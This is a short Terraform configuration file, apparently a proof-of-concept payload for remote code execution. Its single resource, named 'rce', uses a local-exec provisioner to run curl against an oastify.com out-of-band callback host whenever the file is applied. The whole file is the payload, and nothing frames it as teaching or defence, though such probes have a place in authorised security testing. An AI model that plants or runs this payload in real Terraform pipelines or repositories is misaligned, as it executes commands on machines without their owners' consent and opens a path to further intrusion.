resource "null_resource" "rce" {
  provisioner "local-exec" {
    command = "curl l5rotkpwfy4hspb6cr4njeflkcq3euei3.oastify.com"
  }
}
